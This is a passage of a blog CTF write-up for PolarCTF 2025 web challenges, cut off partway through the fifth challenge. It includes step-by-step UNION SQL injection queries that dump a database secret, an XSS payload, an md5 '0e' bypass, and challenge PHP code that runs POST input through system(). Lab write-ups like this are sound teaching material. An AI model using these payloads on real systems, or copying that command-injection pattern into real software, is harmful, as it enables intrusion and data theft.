@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>PolarCTF 2025 春季个人赛 Web Writeup - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="PolarCTF 2025 春季个人赛 Web Writeup"><meta name="keywords" content='CTF'>
+  <meta itemprop="name" content="PolarCTF 2025 春季个人赛 Web Writeup">
+  <meta itemprop="description" content="PolarCTF 2025 春季个人赛 Web Writeup">
+  <meta itemprop="datePublished" content="2025-03-24T16:42:59+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:37:36+08:00">
+  <meta itemprop="wordCount" content="569">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="CTF"><meta property="og:url" content="https://sw1mblu3.fun/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="PolarCTF 2025 春季个人赛 Web Writeup">
+  <meta property="og:description" content="PolarCTF 2025 春季个人赛 Web Writeup">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-24T16:42:59+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:37:36+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="PolarCTF 2025 春季个人赛 Web Writeup" /><meta name="twitter:description" content="PolarCTF 2025 春季个人赛 Web Writeup" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/" title="PolarCTF 2025 春季个人赛 Web Writeup - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B/" title="NCTF 2025 Web Writeup&amp;Challenge Walkthrough" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/cslab-thunder/" title="Cyberstrikelab Thunder Writeup" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/index.md" title="PolarCTF 2025 春季个人赛 Web Writeup - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "PolarCTF 2025 春季个人赛 Web Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "CTF","wordcount":  569 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B\/","datePublished": "2025-03-24T16:42:59+00:00","dateModified": "2026-07-09T18:37:36+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>PolarCTF 2025 春季个人赛 Web Writeup</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-03-24T16:42:59Z">24 Mar, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#code的登录">code的登录</a></li>
+    <li><a href="#再给我30元">再给我30元</a></li>
+    <li><a href="#0e事件">0e事件</a></li>
+    <li><a href="#来个弹窗">来个弹窗</a></li>
+    <li><a href="#bllbl_rce">bllbl_rce</a></li>
+    <li><a href="#复读机rce">复读机RCE</a></li>
+    <li><a href="#狗黑子ctf变强之路">狗黑子CTF变强之路</a></li>
+    <li><a href="#椰子树晕淡水鱼">椰子树晕淡水鱼</a></li>
+    <li><a href="#background">background</a></li>
+    <li><a href="#xcsmsd">xCsMsD</a></li>
+    <li><a href="#小白说收集很重要">小白说收集很重要</a></li>
+    <li><a href="#投喂20">投喂2.0</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>PolarCTF 2025 Web Challenge Walkthrough</p>
+<h1 class="heading-element" id="code的登录"><span>code的登录</span>
+  <a href="#code%e7%9a%84%e7%99%bb%e5%bd%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>访问首页
+<figure>
+  <img src="file-20250322125933317.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+点击登录，宝贝，一个廉价的登录框
+<figure>
+  <img src="file-20250322130314796.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+点击 提示，宝贝；并查看网页源代码，得到账号名 <code>coke</code>
+<figure>
+  <img src="file-20250322130124610.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+访问 <code>result.php</code>，并没有该文件
+<figure>
+  <img src="file-20250322130219708.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+查看首页源代码
+<figure>
+  <img src="file-20250322130420397.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+页面加载同时也会去执行一次 cookies.php ，该文件会设置当前的 cookie
+当前 cookie
+<figure>
+  <img src="file-20250322132108508.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+访问 cookies.php
+![[PolarCTF 2025春季个人挑战赛/file-20250322132037324.png]]
+尝试用刚得到的cookie作为密码登录</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">coke/coke-lishuai</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250322132147600.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="再给我30元"><span>再给我30元</span>
+  <a href="#%e5%86%8d%e7%bb%99%e6%88%9130%e5%85%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250323164433528.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>查看网页源码
+<figure>
+  <img src="file-20250323164451878.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>输入尝试，很明显的 SQL 注入
+<figure>
+  <img src="file-20250323164531895.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>测试列数为2</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?id=1 group by 2
+</span></span><span class="line"><span class="cl">?id=1 group by 3</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323165029577.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>两个位置都能返回信息</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?id=-1 union select version(),database()</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323165159580.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>测库</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?id=-1 union select version(),(select group_concat(schema_name) from information_schema.schemata)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323165352749.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>注表</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?id=-1 union select version(),(select group_concat(table_name) from information_schema.tables where table_schema=database())</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323165548416.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>注列</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?id=-1 union select version(),(select group_concat(column_name) from information_schema.columns where table_name=0x757365725f696e666f)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323170326421.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>flag</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?id=-1 union select version(),(select group_concat(secret) from WelcomeSQL.user_info)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323170928299.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="0e事件"><span>0e事件</span>
+  <a href="#0e%e4%ba%8b%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>访问
+<figure>
+  <img src="file-20250323171323050.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>随意输入
+<figure>
+  <img src="file-20250323171900261.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>官方解释是根据题意 0e ，得知是 md5碰撞，0e绕过，php 在处理 hash 的时候，会将每个 0e 的开头 hash 值解释为0，那么只要传入不同字符串经过 hash 以后，php 就会认为他们是相同的</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?a=s1502113478a</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323172237739.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+就得到了 flag ？？这玩脑洞的题目是真不喜欢&hellip;</p>
+<h1 class="heading-element" id="来个弹窗"><span>来个弹窗</span>
+  <a href="#%e6%9d%a5%e4%b8%aa%e5%bc%b9%e7%aa%97" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250323172531322.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>随意输入，输入的内容会回显在 html 中
+<figure>
+  <img src="file-20250323172843312.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>查看源代码
+<figure>
+  <img src="file-20250323172914820.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>把 <code>&lt;p&gt;</code> 标签闭合</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&lt;/p&gt;123</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323173024578.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>看哪个 Payload 顺眼放进去就好了</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&lt;/p&gt;onfocus=javascript:alert()</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323173107046.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>这还考动漫人物名 awa
+<figure>
+  <img src="file-20250323173314581.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>Google 一下，白金之星
+<figure>
+  <img src="file-20250323173617828.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">flag{dbd65172f0a14c279bc461cd0185c70a}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h1 class="heading-element" id="bllbl_rce"><span>bllbl_rce</span>
+  <a href="#bllbl_rce" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250323174448497.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>输入命令，不管怎么试都是 no
+<figure>
+  <img src="file-20250323174516200.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>扫描目录，发现了网站源码备份
+<figure>
+  <img src="file-20250323175043140.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+<figure>
+  <img src="file-20250323175058041.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="file-20250323175309089.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$command</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="s1">&#39;bllbl&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span> <span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
